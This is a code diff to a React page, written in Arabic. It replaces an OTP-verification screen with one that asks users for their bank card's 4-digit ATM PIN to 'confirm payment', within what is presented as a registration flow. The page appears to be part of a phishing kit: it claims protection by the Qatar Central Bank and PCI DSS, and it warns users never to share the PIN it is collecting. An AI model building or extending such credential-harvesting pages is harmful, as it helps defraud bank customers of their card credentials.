@@ -17,19 +17,15 @@ const steps = [
   { number: 4, title: "إتمام التسجيل" },
 ];
 
-const OTPVerification = () => {
-  const [otp, setOtp] = useState("");
+const ATMPin = () => {
+  const [pin, setPin] = useState("");
   const navigate = useNavigate();
 
-  const handleVerify = () => {
-    if (otp.length === 6) {
-      navigate('/atm-pin');
+  const handleConfirm = () => {
+    if (pin.length === 4) {
+      alert("تم تأكيد عملية الدفع بنجاح");
+      // يمكن إضافة المزيد من المنطق هنا
     }
-  };
-
-  const handleResend = () => {
-    alert("تم إرسال رمز التحقق مرة أخرى");
-    setOtp("");
   };
 
   return (
@@ -54,57 +50,58 @@ const OTPVerification = () => {
                     strokeLinecap="round"
                     strokeLinejoin="round"
                     strokeWidth={2}
-                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                   />
                 </svg>
               </div>
               <h2 className="text-2xl font-bold mb-2 text-foreground">
-                التحقق من الدفع الإلكتروني
+                إدخال الرقم السري للبطاقة
               </h2>
               <p className="text-sm text-muted-foreground">
-                لضمان أمان عملية الدفع
+                لتأكيد عملية الدفع الإلكتروني
               </p>
             </div>
 
             <div className="bg-background rounded-lg p-6 mb-6">
               <p className="text-base text-foreground text-right mb-6 leading-relaxed">
-                تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لإتمام عملية الدفع بشكل آمن.
+                لإتمام عملية الدفع بشكل آمن، يرجى إدخال الرقم السري (PIN) الخاص ببطاقتكم المصرفية المكون من 4 أرقام في الحقل أدناه.
               </p>
 
               <div className="flex justify-center mb-6" dir="ltr">
                 <InputOTP
-                  maxLength={6}
-                  value={otp}
-                  onChange={(value) => setOtp(value)}
+                  maxLength={4}
+                  value={pin}
+                  onChange={(value) => setPin(value)}
+                  inputMode="numeric"
+                  pattern="[0-9]*"
                 >
-                  <InputOTPGroup>
-                    <InputOTPSlot index={0} />
-                    <InputOTPSlot index={1} />
-                    <InputOTPSlot index={2} />
-                    <InputOTPSlot index={3} />
-                    <InputOTPSlot index={4} />
-                    <InputOTPSlot index={5} />
+                  <InputOTPGroup className="gap-3">
+                    <InputOTPSlot index={0} className="w-14 h-14 text-2xl" />
+                    <InputOTPSlot index={1} className="w-14 h-14 text-2xl" />
+                    <InputOTPSlot index={2} className="w-14 h-14 text-2xl" />
+                    <InputOTPSlot index={3} className="w-14 h-14 text-2xl" />
                   </InputOTPGroup>
                 </InputOTP>
               </div>
 
-              <div className="text-center mb-6">
-                <p className="text-sm text-muted-foreground mb-2">
-                  لم تستلم رمز التحقق؟
-                </p>
-                <Button
-                  variant="link"
-                  onClick={handleResend}
-                  className="text-primary hover:text-primary/80 font-medium"
-                >
-                  إعادة إرسال الرمز
-                </Button>
+              <div className="bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800 rounded-lg p-4 mb-4">
+                <div className="flex items-start gap-2">
+                  <span className="text-lg">⚠️</span>
+                  <div className="text-right">
+                    <p className="text-sm font-semibold text-amber-900 dark:text-amber-200 mb-1">
+                      تنبيه هام
+                    </p>
+                    <p className="text-xs text-amber-800 dark:text-amber-300">
+                      لا تشارك الرقم السري لبطاقتكم مع أي شخص. موظفو البنك أو الجهات الرسمية لن يطلبوا منكم هذا الرقم.
+                    </p>
+                  </div>
+                </div>
               </div>
 
               <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 flex items-start gap-2">
-                <span className="text-lg">ℹ️</span>
+                <span className="text-lg">🔐</span>
                 <p className="text-xs text-foreground text-right">
-                  <strong>ملاحظة هامة:</strong> رمز التحقق صالح لمدة 5 دقائق فقط. في حال انتهاء صلاحية الرمز، يرجى طلب إرسال رمز جديد.
+                  <strong>حماية معلوماتكم:</strong> جميع البيانات المالية محمية بتشفير متقدم من الدرجة المصرفية (SSL 256-bit) وفقاً لمعايير الأمان الدولية PCI DSS.
                 </p>
               </div>
             </div>
@@ -112,14 +109,14 @@ const OTPVerification = () => {
             <div className="flex gap-3 flex-row-reverse">
               <Button 
                 className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
-                onClick={handleVerify}
-                disabled={otp.length !== 6}
+                onClick={handleConfirm}
+                disabled={pin.length !== 4}
               >
                 تأكيد الدفع
               </Button>
               <Button 
                 variant="outline"
-                onClick={() => navigate('/registration-complete')}
+                onClick={() => navigate('/otp-verification')}
               >
                 رجوع
               </Button>
@@ -127,9 +124,9 @@ const OTPVerification = () => {
 
             <div className="mt-6 pt-6 border-t border-border">
               <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
-                <span>🔒</span>
+                <span>🏦</span>
                 <p className="text-center">
-                  جميع البيانات محمية بتقنية التشفير المتقدمة وفقاً للمعايير الأمنية المعتمدة في دولة قطر
+                  عملية الدفع محمية من قبل مصرف قطر المركزي والبنوك المعتمدة في دولة قطر
                 </p>
               </div>
             </div>
@@ -142,4 +139,4 @@ const OTPVerification = () => {
   );
 };
 
-export default OTPVerification;
+export default ATMPin;
